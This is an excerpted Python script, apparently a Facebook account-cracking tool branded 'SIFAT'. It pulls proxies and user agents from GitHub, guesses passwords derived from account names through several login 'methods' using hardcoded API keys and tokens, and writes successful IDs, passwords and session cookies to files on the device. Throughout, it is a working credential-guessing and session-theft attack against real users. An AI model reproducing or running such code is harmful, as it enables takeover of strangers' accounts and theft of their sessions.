...
try:
	prox= requests.get('https://raw.githubusercontent.com/SIFAT-ZX/main1/main/proxies.txt').text
...
android_models=[]
try:
	xx = requests.get('https://raw.githubusercontent.com/SIFAT-ZX/main1/main/strings.txt').text.splitlines()
	for line in xx:
...
usr=[]
try:
	xd=requests.get('https://raw.githubusercontent.com/SIFAT-ZX/main1/main/ua.txt').text.splitlines()
	for us in xd:
		usr.append(us)
except: pass
...
logo = """\x1b[1;93m
 .d8888b. 8888888 8888888888     d8888 88888888888 
d88P  Y88b  888   888           d88888     888     
Y88b.       888   888          d88P888     888     
 "Y888b.    888   8888888     d88P 888     888     
    "Y88b.  888   888        d88P  888     888     
      "888  888   888       d88P   888     888     
Y88b  d88P  888   888      d8888888888     888     
 "Y8888P" 8888888 888     d88P     888     888
\033[1;34m───────────────────────────────────────
\033[1;31m[ \033[1;32mDEVELOPER\033[1;31m] \033[1;35m<>  \033[1;32mSIFAT AHOMMED 
...
\033[1;31m[ \033[1;32mVERSION  \033[1;31m] \033[1;35m<> \033[1;32m 1.0
\033[1;34m───────────────────────────────────────\033[1;37m"""
def clear():
    os.system("clear")
    print(logo)    
...
def menu_apikey():
  ...
  try:
    ...
    if id in httpCaht:
      ...
      os.system(f'xdg-open {tan}://wa.me/+8801701613050?text='+id)
      time.sleep(2)
      sys.exit()
  except:
    sys.exit()
...
class main_crack():
    ...
    def methodA(self, sid, name, psw):
        try:
            global oks,cps,loop
            sys.stdout.write(f"\r {S}[Mr.SIFAT-M1] {loop} | M1 OK/CP {len(oks)}/{len(cps)} | {S}{'{:.0%}'.format(loop/float(len(self.id)))}{S}")
            sys.stdout.flush()
            fs = name.split(' ')[0]
            try:
                ls = name.split(' ')[1]
...
"api_key": "882a8490361da98702bf97a021ddc14d"}
    ...
    def methodC(self, sid, name, psw):
        try:
            global oks,cps,loop
            sys.stdout.write(f"\r {S}[Mr.SIFAT-M3] {loop} | M3 OK/CP {len(oks)}/{len(cps)} | {S}{'{:.0%}'.format(loop/float(len(self.id)))}{S}")
            sys.stdout.flush()
            fs = name.split(' ')[0]
            try:
                ls = name.split(' ')[1]
...
'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62',}
    ...
    def methodB(self, sid, name, psw):
        try:
            global oks,cps,loop
            sys.stdout.write(f"\r {S}[Mr.SIFAT-M2] {loop} | M2 OK/CP {len(oks)}/{len(cps)} | {S}{'{:.0%}'.format(loop/float(len(self.id)))}{S}")
            sys.stdout.flush()
            fs = name.split(' ')[0]
            try:
                ls = name.split(' ')[1]
...
'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62',}
                ...
                if 'session_key' in q:
                    ckkk = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"]);KINGb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-");cookie = f"sb={KINGb};{ckkk}"
                    print(f"\r{A} [SIFAT-OK] {sid} | {ps} {S}")
                    oks.append(sid)
                    open('/sdcard/SIFAT_OK_ids_M2.txt','a').write(sid+'|'+ps+'\n');open('/sdcard/SIFAT_iDs_COOKiEs_M2.txt','a').write(sid+'|'+ps+'|'+cookie+'\n')
                    break
                elif 'www.facebook.com' in q['error']['message']:
                    print(f"\r{R} [SIFAT-CP] {sid} | {ps} {S}")
                    cps.append(sid)
                    open('/sdcard/SIFAT_CP.txt','a').write(sid+'|'+ps+'\n')
                else:
                    continue
    ...
    def methodF(self, sid, name, psw):
        global oks,cps,loop
        sys.stdout.write(f"\r {S}[Mr.SIFAT-M6] {loop} OK/CP {len(oks)}/{len(cps)} | {S}{'{:.0%}'.format(loop/float(len(self.id)))}{S}")
        sys.stdout.flush()
        fs = name.split(' ')[0]
        try:
            ls = name.split(' ')[1]
    ...
    def methodE(self, sid, name, psw):
        global oks,cps,loop
        sys.stdout.write(f"\r {S}[Mr.SIFAT-M5] {loop} OK/CP {len(oks)}/{len(cps)} | {S}{'{:.0%}'.format(loop/float(len(self.id)))}{S}")
        sys.stdout.flush()
        fs = name.split(' ')[0]
        try:
            ls = name.split(' ')[1]
    ...
    def methodD(self, sid, name, psw):
        global oks,cps,loop
        sys.stdout.write(f"\r {S}[Mr.SIFAT-M4] {loop} OK/CP {len(oks)}/{len(cps)} | {S}{'{:.0%}'.format(loop/float(len(self.id)))}{S}")
        sys.stdout.flush()
        fs = name.split(' ')[0]
        try:
            ls = name.split(' ')[1]
